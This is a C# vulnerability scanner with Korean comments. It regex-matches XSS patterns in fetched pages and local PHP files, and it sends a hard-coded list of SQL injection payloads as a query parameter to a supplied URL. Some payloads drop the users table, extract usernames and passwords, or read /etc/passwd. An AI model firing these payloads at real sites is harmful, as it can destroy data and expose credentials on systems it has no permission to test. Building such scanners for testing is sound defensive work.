using Microsoft.AspNetCore.Mvc.ModelBinding.Binders;
using System;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Sevz.Services;
using Microsoft.Extensions.Configuration;

namespace VulnerabilityScanner
{
    public static class Suggestions
    {
        // XSS 및 SQL Injection 취약점 스캐너
        public static async Task ScanForXssAndSqlInjection(string url)
        {
            try
            {
                string pageSource = await GetPageSourceAsync(url);
                if (!string.IsNullOrEmpty(pageSource))
                {
                    ScanForXss(pageSource);
                    await ScanForSqlInjection(url);  // URL을 활용하여 SQL Injection 공격 시도
                }
                else
                {
                    Console.WriteLine("페이지 소스를 가져올 수 없습니다.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"오류 발생: {ex.Message}");
            }
        }

        // 웹 페이지 소스 가져오기
        private static async Task<string> GetPageSourceAsync(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync(url);
                if (response.IsSuccessStatusCode)
                {
                    return await response.Content.ReadAsStringAsync();
                }
                else
                {
                    Console.WriteLine($"Failed to access {url}. Status Code: {response.StatusCode}");
                    return null;
                }
            }
        }

        // XSS 취약점 스캔
        private static void ScanForXss(string pageSource)
        {
            Console.WriteLine("\nXSS 취약점 스캔 중...");

            string[] xssPatterns = new string[]
            {
                @"<script.*?>.*?</script>",  // 스크립트 태그
                @"javascript:.*",            // 자바스크립트 호출
                @"<img.*?onerror=.*?>",       // 이미지 태그에 onerror 이벤트
                @"<.*?onmouseover=.*?>"       // onmouseover 이벤트
            };
            int detectedxssCount = 0;

            bool found = false;

            foreach (var pattern in xssPatterns)
            {
                MatchCollection matches = Regex.Matches(pageSource, pattern, RegexOptions.IgnoreCase);
                if (matches.Count > 0)
                {
                    detectedxssCount++;
                    found = true;
                    Console.WriteLine($"[XSS] 발견됨: {matches.Count}개 잠재적인 XSS 취약점:");
                    foreach (Match match in matches)
                    {
                        Console.WriteLine($" - {match.Value}");
                    }
                }
            }
            
            if (detectedxssCount > 0)
            {
                Console.WriteLine($"\n총 {detectedxssCount}개의 XSS 취약점이 발견되었습니다.");
            }
            else
            {
                Console.WriteLine("XSS 취약점이 발견되지 않았습니다.");
            }
        }

        // SQL Injection 취약점 스캔
        private static async Task ScanForSqlInjection(string url)
        {
            Console.WriteLine("\nSQL Injection 취약점 스캔 중...");

            string[] sqlInjectionPayloads = new string[]
            {
                // 기본 SQL Injection 패턴
                "' OR 1=1--",
                "' OR 'a'='a'--",    

                // UNION 기반 SQL Injection
                "' UNION SELECT NULL--",
                "' OR 1=0 UNION SELECT username, password FROM users--",

                // 데이터베이스 정보 추출
                "' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'users'--",

                // 블라인드 SQL Injection - 참/거짓 조건 사용
                "' AND 1=1--",       // 항상 참
                "' AND 1=0--",       // 항상 거짓

                // 시간 기반 블라인드 SQL Injection (MySQL)
                "' OR IF(1=1, SLEEP(5), 0)--",  // 1=1이면 5초 지연
                "' OR IF(1=0, SLEEP(5), 0)--",  // 1=0이므로 지연 없음

                // 오류 기반 SQL Injection
                "' OR 1=1; DROP TABLE users--",  // 테이블 삭제 시도
                "' OR 1=1; SELECT version()--",  // MySQL 버전 확인
                "' OR 1=1; SELECT database()--", // 현재 데이터베이스 이름 확인

                // 논리적 오류 유발 SQL Injection
                "' AND 1=CONVERT(int, 'abc')--",  // 데이터 유형 불일치 유발
                "' AND (SELECT COUNT(*) FROM users) > 0--", // 데이터 존재 여부 확인

                // 댓글 스타일 주석을 사용한 패턴 (다양한 DBMS에서 주석을 달리 처리할 수 있음)
                "' OR 1=1/*",   // 주석으로 나머지 쿼리 무시
                "' OR 'a'='a'/*", // 주석으로 쿼리 무시

                // 다중 쿼리 실행 시도 (MySQL에 주로 해당)
                "'; DROP TABLE users;--",
                "'; SELECT * FROM information_schema.tables;--",

                // 특수 문자 기반 SQL Injection
                "' OR ''='",   // 빈 문자열 비교
                "' OR ' ' = '", // 공백 문자 비교
                "' OR ''='';--", // 빈 문자열로 SQL 무력화

                // 복합 SQL Injection
                "'; SELECT load_file('/etc/passwd')--",  // 서버 파일 읽기 시도 (MySQL)
                "' AND 1=1 UNION SELECT NULL, NULL, NULL--",  // 다중 컬럼 SELECT 시도
                "' OR EXISTS(SELECT * FROM users)--",   // 레코드 존재 여부 확인
                "' AND EXISTS(SELECT 1)--",             // 논리적 참 확인

                // NoSQL Injection (MongoDB, 등)
                "' OR { '$ne': null }--",  // NoSQL에서의 조건 변조
                "' OR { '$gt': '' }--",    // 대소 비교를 통한 NoSQL Injection
            };

            int detectedsqlCount = 0;

            foreach (var payload in sqlInjectionPayloads)
            {
                string vulnerableUrl = $"{url}?param={Uri.EscapeDataString(payload)}";
                Console.WriteLine($"Testing: {vulnerableUrl}");

                string result = await SendHttpRequest(vulnerableUrl);

                if (IsSqlInjectionDetected(result))
                {
                    detectedsqlCount++;
                    Console.WriteLine($"[취약] SQL Injection 발견됨! 페이로드: {payload}");
                    return;
                }
            }
            if (detectedsqlCount > 0)
            {
                Console.WriteLine($"\n총 {detectedsqlCount}개의 SQL Injection 취약점이 발견되었습니다.");
            }
            else
            {
                Console.WriteLine("SQL Injection 취약점이 발견되지 않았습니다.");
            }
        }

        //sqlinjections_vulnerable.sqlinjection();
        private static async Task<string> SendHttpRequest(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync(url);
                return await response.Content.ReadAsStringAsync();
            }
        }

        // SQL Injection 탐지 방법
        private static bool IsSqlInjectionDetected(string responseContent)
        {
            // SQL 오류 메시지나 비정상적인 응답 확인 (간단한 예시)
            return responseContent.Contains("SQL syntax") || responseContent.Contains("database error");
        }

        public static async Task suggetions()
        {
            // 특정 폴더 경로를 입력 받기
            IConfiguration config = new ConfigurationBuilder()
                .SetBasePath(Directory.GetCurrentDirectory())
                .AddJsonFile("Configurations/appsettings.json", optional: false, reloadOnChange: true)
                .Build();

            // 해당 폴더에 있는 모든 .php 파일을 탐색
            string folderPath = config["TargetFolder:Folder"];
            if (string.IsNullOrEmpty(folderPath))
            {
                Console.WriteLine("파일 경로를 확인해주세요.");
                return;
            }

            // 각 .php 파일의 내용을 읽어서 변수에 저장
            List<string> phpFiles = GetPhpFiles(folderPath);

            if (phpFiles.Count == 0)
            {
                Console.WriteLine("No .php files found in the specified folder.");
                return;
            }

            // 각 .php 파일의 내용을 읽어서 출력 또는 변수에 저장
            foreach (string filePath in phpFiles)
            {
                string fileContent = File.ReadAllText(filePath);
                ScanForXss(fileContent);
                //Console.WriteLine($"File: {filePath}");
                //Console.WriteLine(fileContent);
            }
        }

        // 특정 폴더에서 .php 파일을 탐지하는 함수
        private static List<string> GetPhpFiles(string folderPath)
        {
            List<string> phpFiles = new List<string>();

            try
            {
                // 모든 .php 파일을 검색
                string[] files = Directory.GetFiles(folderPath, "*.php", SearchOption.AllDirectories);

                // 리스트에 파일 경로 추가
                phpFiles.AddRange(files);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error accessing folder: {ex.Message}");
            }

            return phpFiles;
        }
    }
}
